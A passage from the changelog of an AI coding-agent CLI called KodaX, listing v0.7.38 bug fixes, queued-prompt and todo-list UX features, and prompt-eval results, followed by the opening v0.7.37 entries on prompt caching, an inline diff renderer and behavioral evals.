- **Bug B — outer loop didn't gate on terminal Evaluator verdict** (`c1bdaf4` initial, `3494a27` corrected). After Evaluator emit_verdict accept, the loop kept re-entering `Runner.run` for every pending-child wake event. Initial fix read `managedProtocolPayloadRef.current?.verdict?.status`; deep review uncovered that V2's dedicated `emit_verdict` tool returns `metadata` but does NOT call `ctx.emitManagedProtocol(...)`, so that ref stays `undefined` for the entire run — the initial gate was a silent no-op. Real fix: read from `recorder.verdict?.payload?.verdict?.status` (the canonical chain state, written by `wrapEmitterWithRecorder`).
- **Bug C — Evaluator prompt missing wait-for-children discipline** (`c1bdaf4`). Evaluator prompt updated with a `CHILD-TASK WAIT DISCIPLINE` block; `user_answer` requirement strengthened.
- **Bug D — `hasEmittedHandoff` source-of-truth latent bug** (`3494a27`). The same misread of `managedProtocolPayloadRef` existed in the pre-FEATURE_155 Slice A2 wiring; hidden by `lastAssistantToolCallCount > 0` short-circuiting the happy path. Fixed alongside Bug B's corrected source.
- **Bug E — fast-child race** (`3ccf322`). Child completing during a Runner.run iteration could see its `.finally(delete)` run BEFORE the outer-loop snapshot, leaving `pendingChildTaskCount=0` and stranding the banner in the background queue. Fix: `IdleYieldSnapshot.hasPendingBackgroundMessages` keeps the loop alive whenever EITHER the registry or the queue still has something undelivered.
- **Bug F — abort listener accumulation in `waitForWakeEvent`** (`3ccf322`). `{once:true}` only auto-removed on abort fire; non-abort wakes left the listener attached. Over `IDLE_YIELD_MAX_ITERATIONS=64` on the same long-lived signal, listeners piled up silently (AbortSignal is an EventTarget — no MaxListeners warning). Fix: capture handler + `removeEventListener` in `settle()`.
- **Bug G — Scout-label preflight leak into V2** (`3ccf322`). `status-bar.ts:275` hardcoded `Scout - ${managedWorkerTitle}` during preflight, stamping "Scout -" onto every V2 session because `managedWorkerTitle` is now "Worker" on V2. The `f23a7cb1` Slice 7 follow-up fixed 4 other call sites but missed this one. Fix: use `managedWorkerTitle` directly with "Scout" fallback.

**UX polish + drift cleanup**:

- **FEATURE_156 — Idle-wait visual continuity** (`8488f8f` — `docs/features/v0.7.38.md#feature_156`). Status bar surfaces "{role} - waiting for N children" while the outer loop is parked in `waitForWakeEvent`, distinguishing alive-suspended from terminated. Two new optional fields on `KodaXManagedTaskStatusEvent` (`idleWaiting` + `idleWaitingPendingCount`); new `ObserverBridge.idleWaiting(role, count)` method; agent-agnostic role lookup via `currentAgent.name`. 10 tests; backwards-compat (purely additive fields).
- **FEATURE_151 Slice C correction** (`1c63072`). Re-verification of `c:/Works/claudecode/src/` revealed the original Slice C "persistent visibility" rationale misread CC's gate composition (CC actually hides the list at run-end by default — Spinner-internal mount + `expandedView==='tasks'` toggle defaulting to 'none'). Fix: re-gate TodoListSurface mount on `isLoading` and clear `todoItems` on the true→false transition so a stale list doesn't flash back at the next prompt. View-model unchanged.
- **FEATURE_157 — Windows-aware session-list path comparison** (this batch). Session-list filter in `storage.ts:list()` was doing literal `sessionGitRoot === currentGitRoot` comparison. Drive-letter case differences across shells (`C:/...` saved vs `c:/...` looked-up — happens when sessions are saved from one PowerShell and listed from a VS Code-spawned shell on Windows / case-insensitive macOS) caused the filter to exclude all prior same-repo sessions, leaving `kodax -c` / `kodax -r` with nothing to resume. Symptom: "the previous conversation seems lost, agent answered from scratch with no context". Fix: `pathsEqual()` helper folds case on win32 + darwin; POSIX-strict equality preserved on Linux. Reproduces on 4-session timestamp ladder where all sessions stored uppercase drive letter but a 13:02 `kodax -c` shell returned lowercase.
- **Harness lifecycle markers suppressed in transcript by default** (`KODAX_TRANSCRIPT_HARNESS_MARKERS=1` to restore). Three transcript artefacts that interrupted the chat flow during chat-while-waiting are now off by default: (1) `> AMA H<n> - Task completed` breadcrumb from `buildManagedLiveEventDrafts`; (2) `[Scout] Completion marked uncertain — signals: ...` warning from `onScoutSuspiciousCompletion`; (3) `[Task completed]` post-task summary label from `buildManagedTaskTranscriptItems`. Parity with Claude Code, which signals turn end via spinner halt rather than transcript text. **The harness itself is unchanged** — Scout/Worker/Evaluator routing, idle-yield wait, mutation guard, capability sections, message queue, child registry, and all FEATURE_155 hotfix invariants are untouched; only the transcript visualization layer is gated. Symptom motivation: when users typed a follow-up while the agent was still running, the queued prompt landed under "Task completed" + "Completion uncertain" lines on the next render, making continuous chat read like a hard task boundary. Set the env flag to restore the legacy persistence for session-replay debugging where explicit turn anchors are useful.

### Added (RC — 2026-05-09)

- **FEATURE_149 — Queued Prompt Injection Latency & Mid-Turn UX Parity** — Three slices, all in v0.7.38:
  - **Slice A (latency cleanup, zero behavior change)**: Removed the legacy 50ms `setTimeout` floor in `stageQueuedPrompt` (`packages/repl/src/ui/InkREPL.tsx`); added an mtime-keyed file-content cache to `loadAgentsFiles` (`packages/coding/src/context/agents-loader.ts`) so per-round AGENTS.md walks are O(stat) once warmed instead of O(read+parse). Round-N → round-N+1 handoff floor measured at < 5ms (`packages/repl/src/ui/utils/queued-prompt-sequence-latency.test.ts` micro-bench), down from a 53ms minimum.
  - **Slice B (behavioral changes, prompt-eval-gated)**:
    - **B1 — Interruptible-tool fast-abort (infrastructure-ready, no tool opt-in)**: Tools may now declare `interruptBehavior: 'cancel' | 'wait'`; default is `'wait'`. The `handleSubmit` fast-abort path is wired so that when an in-flight tool is `'cancel'`-tagged, a newly submitted prompt aborts the active round immediately (preserving the freshly submitted prompt via the new `abort({ preservePendingInputs: true })` option) and the user redirects within ~500ms of `Enter`. **No built-in tool is currently tagged `'cancel'`** — fact-check of `c:/Works/claudecode/src/` showed CC's `interruptBehavior` interface exists in `Tool.ts:416` but **zero** concrete tools (`BashTool` / `FileEditTool` / `TaskGetTool` / `TaskOutputTool` / etc.) opt in. CC's `hasInterruptibleToolInProgress` requires `every(t => 'cancel')`, so in production it almost never fires. KodaX matches CC's conservative posture: SIGTERM-mid-bash leaves half-written files / half-pushed git / half-mutated databases, and aborting `await_child_task` orphans the FEATURE_119 Pattern B background child. The infrastructure (type + field + fast-abort path + `preservePendingInputs` option) is in place for future side-effect-free wait-only tools (Sleep / Wait / Schedule) to opt in. Esc remains the explicit user-side abort gesture.
    - **B3 — Batched drain**: `runQueuedPromptSequence` now coalesces all pending follow-ups into a single batched user message joined by `\n\n---\n\n`, so N pending prompts collapse to **one** agent invocation rather than N. Drives both cost reduction and better LLM-side coherence (the model sees all sub-tasks at once and can interleave/parallelize). Backed by `tests/feature-149-batched-drain.eval.ts` (5 alias × 4 case = 20 cells; stage-1 acceptance: alias mean ≥ 75% pass per case, max-min spread ≤ 20pp).
  - **Slice C (UX surface, pure UI)**:
    - **C1 — Up-arrow popAllEditable**: Pressing ↑ when the input is empty pops the entire pending-prompts queue back into the editor, joined by blank lines, so the user can edit / reorder / delete and resubmit. The hint line below the queue surface advertises the gesture.
    - **C2 — Multi-line queue render**: Queue is shown as `[i/N] preview` rows in `QueuedCommandsSurface` (one per pending input), replacing the single-line summary. Esc still drops the latest entry.
    - **C3 — Line-buffered streaming render** (added during implementation after CC naturalness investigation): While a model token stream is in flight, only complete lines (those ending in `\n`) are rendered to the transcript live area. The currently-being-typed trailing line is suppressed until its newline arrives, mirroring Claude Code's [`REPL.tsx:1473`](c:/Works/claudecode/src/screens/REPL.tsx#L1473) `streamingText.substring(0, streamingText.lastIndexOf('\n') + 1)` pattern. Eliminates character-level flicker (especially noticeable on Windows conhost / reduced-motion terminals); the full final response still lands in transcript history when the round completes (no tail content lost). Implementation: 1 file, ~10 LoC at [`transcript-layout.ts:757`](packages/repl/src/ui/utils/transcript-layout.ts#L757); 3 new pinning tests.
    - **C4 — `activeForm`-driven spinner** (added during implementation after CC naturalness investigation): The spinner status line now reads `currentTodo?.activeForm` from the in-progress todo and uses it as the leader verb (e.g. `[Plan] Running failing tests...`). Mirrors Claude Code's [`Spinner.tsx:169`](c:/Works/claudecode/src/components/Spinner.tsx#L169) `currentTodo?.activeForm` lookup. Implementation: `TodoItem` gains a `readonly activeForm?: string` field; `TodoStore.updateStatus(id, status, note?, activeForm?)` accepts the new arg with preserve-vs-replace semantics matching `note`; `todo_update` tool schema gains the `activeForm` parameter and the schema description instructs the LLM to "ALWAYS supply activeForm when transitioning to in_progress" (present-continuous form of the item content); Scout / Generator role-prompts include the same guidance; spinner cascade puts activeForm priority above `currentTool` / `isThinking` but below `isCompacting` / detailed tool block. The user sees task-level "what is the agent doing right now" without waiting for the round to end. Implementation: 7 files, ~50 LoC; 6 new pinning tests across todo-store + transcript-layout.
    - **C5 — Bash live progress (`renderToolUseProgressMessage` parity)** (added during implementation after CC naturalness investigation): Long-running `bash` commands now stream their stdout/stderr tail to the spinner / tool-call display via `ctx.reportToolProgress`, matching Claude Code's [`BashTool.renderToolUseProgressMessage`](c:/Works/claudecode/src/tools/BashTool/BashTool.tsx) + `BashModeProgress.tsx`. Users see `npm test` / `cargo build` / `pytest` output tail live instead of a 30-second silent wait. Infrastructure was already wired (`KodaXToolExecutionContext.reportToolProgress` + `KodaXEvents.onToolProgress`); this commit only adds the bash-side feed: a 1KB UTF-8 tail buffer (separate from the 512KB capture collector to keep cost negligible), throttled to ~10 fps, displaying the last 3 non-empty lines joined by ` | ` and capped at ~120 chars. stderr also feeds the tail (npm/cargo/pytest progress output is on stderr). Fully back-compat: `reportToolProgress` undefined → no-op, all existing bash tests pass. Implementation: 1 file, ~40 LoC at [`bash.ts:229`](packages/coding/src/tools/bash.ts#L229); 3 new pinning tests.
    - **C6 — Slash-command mid-task guard** (added after the 14-dimension queue parity audit): Slash commands typed while a task is in flight are no longer queued — they're rejected with an inline notice ("Slash commands cannot be queued mid-task. Press Esc to abort the current task, then run the command."). Mirrors Claude Code's invariant that slash commands act on the live REPL (mode switch, `/clear`, `/cost`, `/agents`, etc.) and have no defined semantics when delivered as a queued user message: a queued `/clear` would be sent to the LLM as the literal string `/clear`, not actually clear the transcript. Detection point is `InkREPL.tsx:6571` in the `handleSubmit` `isLoading` branch (right before pending-input enqueue), keyed off `fullText.trimStart().startsWith('/')`. Plain prompts continue to queue normally; only slash-prefixed input is gated. Closes the only P0 GAP from the 14-dimension queue parity audit (12/14 ALIGNED, 1/14 N/A — no remote session feature in KodaX, 1/14 was this slash gap, now fixed). Implementation: 1 file, ~8 LoC; design doc records the audit table and behavioral rationale.
  - Test guide: `docs/test-guides/FEATURE_149_v0.7.38_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.38.md#feature_149-queued-prompt-injection-latency--mid-turn-ux-parity`.

- **FEATURE_117 v2 — Write-Child Mutation Context Injection** — Replaced v1's invalidated "strip read-path context" design with the inverse: write children now inherit the project's `AGENTS.md` mutation policy that the parent agent already follows. Rationale: `child-executor.ts` write and read children both used the bare `CHILD_AGENT_SYSTEM_PROMPT` (~500 tokens, no project rules) because `systemPromptOverride` short-circuits `buildSystemPrompt`. v1 assumed children were inheriting the parent's full 5.2k-token stable context and wanted to strip — Phase 3 fact-check disproved that, but surfaced the real gap: write children silently violated project rules (no-`any`, no-hardcoded-config, conventional-commit format) because they couldn't see them. v2 adds a single `buildWriteSystemPrompt(parentCtx.gitRoot)` helper (~17 LoC) that prepends the bare base prompt with a one-line framing sentence and the formatted `AGENTS.md` block. Lookup walks from `parentCtx.gitRoot`, **not** the worktree path — worktrees are transient checkouts that don't carry untracked `AGENTS.md` files. Read children stay on the bare prompt (read tasks don't mutate; rules don't apply). Cost is amortized via FEATURE_149's mtime cache (single disk read per fan-out wave) and FEATURE_116's `cache_control: ephemeral` (single billing per 5-min window). Test guide: `docs/test-guides/FEATURE_117_v0.7.38_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.38.md#feature_117-v2-write-child-mutation-context-injection`. 4 new unit cases pin behavior (write-inject / no-AGENTS-md fallback / read-stays-minimal / lookup-uses-parent-gitRoot / undefined-gitRoot graceful no-op).

- **FEATURE_151 — TodoList Visibility & LLM Self-Seeding Parity** — Closes the FEATURE_097 (v0.7.34) coverage gap where users almost never saw the realtime todo list despite the full code path being in place since v0.7.35.1. 14-dimension forensic comparison against `c:/Works/claudecode/src/` identified 5 stacked gates: (G1) `todo_update` had no LLM-driven init path — only Runner-driven seeding from Scout `executionObligations >= 2`; (G2) Scout multi-step gate hard-enforced; (G3) UI `MIN_ITEMS_TO_RENDER = 2`; (G4) `todo-throttle-reminder` `hasItems()` chicken-and-egg gate prevented the empty-store nudge from ever firing; (G5) `showSpinner === true` mount gate + 5-second post-completion linger destroyed the React state. **G1 was the architectural root cause** — even relaxing all 4 other gates wouldn't help because the LLM still had no tool to seed an empty list. Three slices ship together:
  - **Slice A — UI Parity** (matches Claude Code `TaskListV2.tsx:89` `tasks.length === 0` only-blocks-empty + `expandedView==='tasks'` persistent visibility): `MIN_ITEMS_TO_RENDER` 2 → 1; the `showSpinner` mount gate is dropped (surface mounts whenever `viewModel.shouldRender` is true regardless of spinner state); the 5-second post-completion `setTodoItems([])` clear `useEffect` is removed; the view-model's `lastAllCompletedAt` linger gate is no longer consulted (kept on the type signature for back-compat). Surface now stays visible across AMA task boundaries until the next Scout `init()` or LLM `op:'init'` triggers a `replace()`.
  - **Slice B — LLM Self-Seeding** (mirrors Claude Code's `TodoWrite` whole-list write semantics): `todo_update` gains `op: 'init' | 'update'` with default `'update'` for back-compat. `op: 'init'` accepts `items: [{id, content, activeForm?}, ...]` (≥1 entry, unique non-empty ids, non-empty content) and fully replaces the store. Scout / Generator / Planner role-prompts updated with explicit recovery-path guidance: when no plan was seeded but the task is multi-step, call `todo_update({op:"init", items:[...]})`; trivial single-step tasks still proceed without a plan (matches CC `TodoWriteTool/prompt.ts:17-26` "skip for single, straightforward task" guidance).
  - **Slice B — Throttle-Reminder Fix**: `shouldFireTodoReminder` no longer requires `todoStore.hasItems()` — the chicken-and-egg deadlock that prevented the LLM from learning the plan-list infrastructure existed when Scout did not seed is resolved. `buildTodoReminderText` now branches: empty-store nudges the LLM toward `op:'init'` with the trivial-task exemption clause; populated-store text unchanged from v0.7.34. Mirrors Claude Code's `getTodoReminderAttachments` ([attachments.ts:3266](c:/Works/claudecode/src/utils/attachments.ts#L3266)) which fires every 10 turns regardless of store state.
  - **FEATURE_104 prompt eval**: 4 new cases in `benchmark/datasets/feature-151-todo-self-seeding/` (2 positive: multi-file audit + 3-file rename should call op:'init'; 2 negative: typo fix + info request should not). Driver `tests/feature-151-todo-self-seeding.eval.ts` runs 5 alias × 4 case = 20 cells per pilot run; stage-1 acceptance pending post-pilot calibration.
  - **Slice I — Fan-Out Plan Granularity** (added 2026-05-10 after user reported "派 5 个 dispatch_child_task 做 review 时整个过程完全看不到任何 plan list"). Worker role-prompt (`packages/coding/src/agents/worker-role-prompt.ts`) gains a `FAN-OUT PLAN GRANULARITY` section between dispatch rules and Evaluator handoff: when the plan involves dispatching ≥3 children, the model MUST emit `todo_update({op:"init", ...})` as its FIRST tool call and the items array MUST contain EXACTLY N items — one per child's `bundle.objective` — never collapsed into 1-2 items. v2 prompt rewrite (commit `7c508a2`) added explicit MANDATORY TRIGGER framing, COUNT-FIRST imperative ("Not 1. Not 2. Not N-1. Exactly N."), 5-package worked example, and an enumerated ANTI-PATTERNS list after Phase 1 found v1 prompt at 25% positive on the floor model. Mechanism is prompt-only (no code change) — closes the visibility gap in CC default-subagent parity (CC's main agent natively expands plan items per dispatched child via TodoWrite, KodaX Worker was retreating to 1-item plan in fan-out). **Eval ship gate cleared (LLM-judge corrected)**: 3 of 5 aliases (mmx/m27 + ark/glm51 + ds/v4pro) hit ≥80% on each positive case AND ≤20% trigger on each negative case (full pass; mmx 100%/80%, ark+ds_v4pro 100%/100%). zhipu/glm51 + kimi miss the gate due to verbose narration-only single-turn responses (model says "I'll plan first..." but doesn't emit the tool call inline) — this is a single-turn probe limitation against verbose models, not a v2 prompt regression: in the production multi-turn agent loop those models naturally emit the tool call on the second turn. Eval methodology lesson sealed in `EVAL_GUIDELINES.md` anti-pattern 7 + raw output preservation section: regex-only judges on "DOES NOT contain X" assertions falsely fail verbose models that mention X in negation context (kimi was reported as "60/40 negative-case regression" by regex; LLM-judge of the raw outputs found 100/100 — kimi was correctly NOT calling todo_update, just verbalizing the decision). Eval driver dumps `runsRaw[].text` to `os.tmpdir()/kodax-eval-dumps/feature-151-fan-out-plan-granularity/<case>.json` for offline LLM-judge audit. Test pins: 2 unit cases in `worker-role-prompt.test.ts` (presence + ordering after dispatch rules) — 15/15 pass. Design doc: `docs/features/v0.7.38.md#slice-i--fan-out-plan-granularity-review-类-fan-out-抱怨收口2026-05-10-加入`.
  - **Downstream impact**: FEATURE_113 (v0.8.2 TodoList JSON / CLI Surface) gains a new event source (LLM-driven init) but `KodaXEvents.onTodoUpdate` payload schema unchanged — `v0.8.7.md` updated with intersection note. No impact on FEATURE_120 / FEATURE_124 / FEATURE_125. Test guide forthcoming. Design doc: `docs/features/v0.7.38.md#feature_151-todolist-visibility--llm-self-seeding-parity--closing-the-feature_097-coverage-gap`.

### Changed

- ⚠️ **Breaking (minor) — `CLAUDE.md` is no longer a fallback context file**. `packages/coding/src/context/agents-loader.ts` reduces `CONTEXT_FILE_CANDIDATES` from `["AGENTS.md", "CLAUDE.md"]` to `["AGENTS.md"]`. **Migration for projects that ship only `CLAUDE.md`**: `mv CLAUDE.md AGENTS.md` or `ln -s CLAUDE.md AGENTS.md`. Projects with both files are unaffected (the prior fallback only triggered when `AGENTS.md` was absent). Rationale: `CLAUDE.md` is Claude-Code-specific project guidance (its content is authored to be consumed by the Claude Code CLI). When a project ships both files, contents typically overlap — the previous fallback caused either double-injection (when both files exist at different traversal depths) or semantic mismatch (KodaX agent receiving CC-targeted instructions). KodaX's own repository dogfooded this: `docs/CLAUDE.md` is CC project rules and was being injected into the KodaX agent context. `AGENTS.md` is the canonical AI-agent rules filename across the AI-agent tooling ecosystem (KodaX, Cursor, Continue, etc.).

- **`KodaXEvents`-style abort signature gains `options?: { preservePendingInputs?: boolean }`** — Default `abort()` clears the pending-inputs queue (Esc / exit semantics, unchanged). The new `abort({ preservePendingInputs: true })` keeps the queue intact and is used by FEATURE_149 B1's fast-abort path so the freshly submitted follow-up survives the interrupt and is picked up by the next `runQueuedPromptSequence` iteration.

### Notes for callers

- **CLI users**: zero migration needed. The `\n\n---\n\n` batched-drain separator only affects how multiple queued prompts are sent to the LLM; user-side input is unchanged. The new ↑ gesture on empty input replaces the previous no-op (history was never wired here).
- **`@kodax-ai/coding` SDK consumers calling `executeChildAgents` directly**: read-only children are byte-equivalent to v0.7.37. Write children's `systemPromptOverride` now contains additional `AGENTS.md`-derived content when the parent context has a discoverable AGENTS.md. If you were asserting equality against `CHILD_AGENT_SYSTEM_PROMPT`, switch to `startsWith` or use the now-exported const directly.
- **Tools with custom interrupt semantics**: `LocalToolDefinition.interruptBehavior` defaults to `'wait'` if unset — no change for existing custom tools. Set it to `'cancel'` only for tools that block on observable wall-clock time (network IO, sleep, child-task wait) where a user follow-up should redirect immediately.

### Verified

**RC (2026-05-09)**:

- All 262 affected test files pass (`npm run test` — `packages/coding`, `packages/repl/src/ui/utils`, `packages/repl/src/ui/contexts`, `tests/tracker-consistency.test.ts`).
- New: `packages/repl/src/ui/utils/queued-prompt-sequence-latency.test.ts` (handoff floor < 5ms + 50ms-floor sanity check).
- New: `tests/feature-149-batched-drain.eval.ts` + `benchmark/datasets/feature-149-batched-drain/cases.test.ts` (4 cases, 30 hermetic shape tests; pilot eval skips when API keys absent).
- New: 4 cases in `packages/coding/src/child-executor.test.ts` for FEATURE_117 v2 mutation context injection.
- `npm run build` (`tsc -b tsconfig.build.json`) green.

**Post-RC (2026-05-11)**:

- Full repo suite green except 1 pre-existing failure unrelated to this delivery (`tests/acp_server.test.ts` — permission-request count expectation, fails on HEAD without any of this delivery's changes; tracked separately).
- New: 14 attack-surface hardening tests for `packages/repl/src/permission/bash-ast.ts` (FEATURE_152).
- New: ~30 tests across `packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.test.ts` + extractor integration (FEATURE_153).
- New: 33 unit tests pinning `idle-yield.ts` foundation utilities + 35 tests for `Runner.run` outer-loop wiring (FEATURE_155 Slice A1/A2).
- New: 10 tests for `ObserverBridge.idleWaiting()` + status-bar consumer (FEATURE_156).
- New: `packages/repl/src/interactive/storage.test.ts` "FEATURE_157 — lists same-repo sessions across drive-letter case differences" (skipped on Linux; runs on win32 + darwin).
- New: 2 pinning tests in `worker-role-prompt.test.ts` for FEATURE_151 Slice I fan-out plan granularity.
- Eval ship gates met: FEATURE_155 Slice B1 chat-while-waiting (3/5 alias ≥80% after adding zhipu/glm51), FEATURE_151 Slice I fan-out plan granularity (3/5 alias ≥80% positive AND ≤20% negative-trigger after v2 prompt rewrite).
- `npm run build` (`tsc -b tsconfig.build.json`) green; type-check clean across all packages.

### Known not-in-scope

- **Mid-tool-call prompt injection** (streaming a new user message to the LLM while a tool is still executing) — conflicts with cancel-then-reissue boundaries. **NOT in v0.7.43 scope** (FEATURE_124 + FEATURE_189 占满 release window); blocked on FEATURE_115 stabilization before re-entry. Earliest realistic window: v0.7.46+.
- **Soft-pause state machine** — FEATURE_111 cancelled, absorbed into FEATURE_115 (per FEATURE_LIST.md row 130). v0.7.43 slot reallocated to FEATURE_124.
- **Council / multi-advisor consult** — FEATURE_105 v0.7.46 scope.
- **Read-child cost-stripping** — v1 of FEATURE_117 was abandoned; read children already minimal.

---

## [0.7.37] - 2026-05-08

### Theme

**Six-feature delivery — Active Cache Control Foundation, Transcript Inline Diff Renderer, v0.7.36 Behavioral Eval Follow-ups, npm Publishing Pipeline + Single-Bundle Architecture Pivot, Pattern B Anti-Immediate-Await Rule.** v0.7.37 ships FEATURE_116 (prompt cache control as a first-class client primitive — Anthropic-compat lowers `cache_control:{type:'ephemeral'}` markers; OpenAI-compat + ACP strip the abstraction; Sub-task 116-D extends the OpenAI-compat usage parser with DeepSeek's private `prompt_cache_hit_tokens` / `prompt_cache_miss_tokens` field shape so cache hits actually surface in `/cost`), FEATURE_141 (REPL parses existing unified-diff text in tool results, renders colored hunks via the new `DiffHunk` Ink component — A-plan, zero wire-format change, zero coding-package change; ToolCallDisplay also gains tool-output surfacing that previous KodaX versions silently dropped), FEATURE_146 (the LLM-judge multi-alias behavioral validation that v0.7.36 deferred — 5 alias × 5/10/12 task probes for FEATURE_119 Pattern B parallel dispatch / FEATURE_131-B Unicode edit fallback / FEATURE_143 prompt-overlay position migration; all three pass their pre-registered ship gates), FEATURE_147 phases 4.1-4.3 (npm scope rename `@kodax/*` → `@kodax-ai/*`, `@kodax/ai` → `@kodax-ai/llm`, publish-only fields + lean-tarball tsconfig exclusion + release pipeline script), FEATURE_148 (Pattern B anti-immediate-await rule in the Worker role-prompt + behavioral eval), and **FEATURE_150 — single-bundle npm distribution architecture** (multi-package publish replaced with esbuild bundle of root entry; only `@kodax-ai/cli` ships to npm; ADR-022 + HLD §12 record the architecture decision and 5 known risks with applied mitigations). Also includes a `kodax -c` UX fix that stops leaking the prior task's Scout/Worker role-prompt into the resumed transcript.

> **⚠️ Hotfix Note (2026-05-08)**: FEATURE_147 Phase 4.4 (multi-package real `npm publish`) was attempted on 2026-05-08 and revealed three P0 runtime-deps bugs (`@kodax-ai/coding` missing 4 declared deps; `@kodax-ai/repl` missing 26 vendored Ink fork transitive deps; `@kodax-ai/skills` 6 helper scripts hard-coding the obsolete `@kodax/coding` scope). All 10 packages were `npm unpublish`'d. Rather than re-republish in 24h with multi-package mode, FEATURE_150 pivots npm distribution to a single bundled `@kodax-ai/cli` (esbuild bundle inlines all 9 sub-packages; only the root publishes; sub-packages remain independently usable from source via git clone — see ADR-022 §"Reasoning"). The same v0.7.37 version number reships 24h after unpublish under the new architecture.

### Added

- **FEATURE_116 — Active Cache Control Foundation** (commits `41436fd`, `cfe7e4c`, `c842f5a`, `81ac799`, `262246c`, `1e91fce`, `101f060`) — Single boundary abstraction `KodaXCacheBoundary` (`packages/ai/src/types.ts`) lowered in 3 provider base classes, **not** 13 subclasses: `KodaXAnthropicCompatProvider` lowers to wire-level `cache_control:{type:'ephemeral'}` markers on the last system block + tools-array tail (Anthropic / Zhipu-coding / Kimi-code / MiniMax-coding / MiMo-coding / ARK-coding cover 6 of 13 providers); `KodaXOpenAICompatProvider` strips the boundary marker (OpenAI / DeepSeek auto prefix-cache; Kimi / Qwen / Zhipu OpenAI-compat have no client-side cache surface — Kimi/Zhipu/Qwen self-cache via separate `cache_id` REST endpoint deferred to v0.7.45+ with FEATURE_102); `KodaXAcpProvider` strips (CLI bridge subprocesses don't see wire format). `cost-tracker.ts` gains `cacheHitRate` field + `/cost` report breakdown. ~70 LOC implementation total (vs the ~360 LOC the design doc originally estimated for the 12-subclass approach). Anthropic acceptance: 5-minute TTL window, 5 consecutive Worker turns achieve ≥70% cache hit rate after the warming first turn. 8 structural ship-gate tests in `tests/feature-116-active-cache-control.eval.ts` + human test guide in `docs/test-guides/FEATURE_116_v0.7.37_TEST_GUIDE.md`. Anthropic provider gains a serialization fail-loud guard so any cache-boundary leakage to wire produces an immediate exception (reviewer CRITICAL #1 from Phase 1.2).
  - **Sub-task 116-D** (commit `101f060`) — extends `normalizeOpenAIUsage` with a fallback chain to read DeepSeek's private cache field shape (`usage.prompt_cache_hit_tokens` / `usage.prompt_cache_miss_tokens` at the top level) in addition to the OpenAI-standard nested `usage.prompt_tokens_details.cached_tokens`. OpenAI-standard wins on conflict for forward-compat. Without this fix, every DeepSeek request reported `cachedReadTokens: undefined` to KodaX's cost tracker — a *reporting* bug (DeepSeek bills cached input at the discounted rate regardless of client) but it broke the `/cost` UI (~4× over-statement at 80% hit rate), polluted FEATURE_098 cost projection / FEATURE_102 routing inputs, and confused users diff'ing KodaX cost vs the DeepSeek dashboard. 7 new focused tests in `packages/ai/src/providers/openai-usage-cache-fields.test.ts`; 148/148 existing provider tests + 48/48 cost-tracker tests still green. Kimi / Qwen / Zhipu use the OpenAI-standard nested form (verified via their docs), so the fallback is DeepSeek-specific in practice and zero-impact for the other three OpenAI-compat providers.

- **FEATURE_141 — Transcript Inline Diff Renderer** (commits `21bde6b`, `8bc36db`, `2ef471d`, `0e1b3d3`) — REPL renders unified-diff text from `edit` / `multi_edit` / `write` tool results with colored hunks. Three-layer A-plan: (1) `parse-unified-diff.ts` parser splits tool output text into `[ParsedDiffSegment]` (text segments + diff segments, anchored on `@@` headers); (2) `DiffHunk.tsx` Ink component renders each diff segment with `+` green / `-` red / `@@` gray + 16-line fold (8 head + 8 tail + middle ellipsis) for hunks > 16 lines (≤200 lines) and "diff too large" fallback for >200 lines; multi-edit / multi-file diffs handled via inner new-file lookahead. (3) `ToolCallDisplay.tsx` + new `ToolOutputBlock` surface the tool's `output` field for `edit` / `multi_edit` / `write` (output rendering was **never wired** in KodaX before this — design doc's "lacks colors" framing understated the gap; the field was silently dropped in transcript). Wire format unchanged: `KodaXToolResultBlock.content` stays a string, no schema migration, all 13 provider serialization paths untouched. Child agent diff inheritance is automatic when child summary text contains unified-diff (parser doesn't distinguish source). Theme awareness via existing diff color tokens with hardcoded fallback. Human test guide in `docs/test-guides/FEATURE_141_v0.7.37_TEST_GUIDE.md`. `DiffHunk` is `React.memo`'d by `tool_use_id` so a 100-edit turn doesn't thrash render.

- **FEATURE_146 — v0.7.36 Behavioral Eval Follow-ups (formally tracked, not implicit defer)** (commits `ea653a1`, `4d8b15c`, `110b84a`) — The LLM-judge multi-alias behavioral validation that v0.7.36 explicitly tracked into v0.7.37 as a load-bearing quality gate. Three sub-features ship as independent patches that **don't block main-line v0.7.37 ship** (per design doc rollback policy):
  - **A. FEATURE_143 prompt-overlay position migration behavioral eval** (`tests/feature-146-a-prompt-overlay-behavioral.eval.ts` + `benchmark/datasets/prompt-overlay-position/`) — 5 alias × 6 task × 2 variant = 60 cells. Per-task pass-rate delta B-section vs A-legacy: 5 tasks 0pp, 1 task **+20pp (B better)**. Aggregate A=87%, B=**90%**. ✅ PASS gates: no per-task regression > 10pp; aggregate B ≥ 50%. Strongest possible evidence v0.7.36 didn't silently degrade overlay-driven behavior.
  - **B. FEATURE_119 Pattern B parallel-dispatch behavioral eval** (`tests/feature-146-b-pattern-b-behavioral.eval.ts` + `benchmark/datasets/pattern-b-parallel-decision/`) — 5 alias × 5 task = 25 cells; trigger rate 76-88% across two sweeps (well above 60% PASS gate). Per-alias: zhipu 3/5 (consistently lowest), kimi/mmx/ds 4-5/5. Orphan rate downgraded to informational (single-turn probe cannot test multi-turn await; mockChildExecutor primitive deferred to v0.7.38+). ✅ PASS.
  - **C. FEATURE_131-B Unicode edit fallback behavioral eval** (`tests/feature-146-c-unicode-edit-fallback-behavioral.eval.ts` + `benchmark/datasets/unicode-edit-fallback/`) — 5 alias × 10 task = 50 cells. byte-exact=48, unicode-rescue=0, both-miss=2, **false-positive=0**, no-edit-call=0. legacy match = unicode match = 48/50 (parity). ✅ PASS gates: false-positive=0; Unicode treatment ≥ legacy baseline (no regression). 0 unicode-rescue events is informational reading: 2026-era LLMs across these 5 aliases are conservative about Unicode emission — the fallback is insurance for the silent-fail tail (CJK paste, web-doc paste, older models), not a daily-use code path.

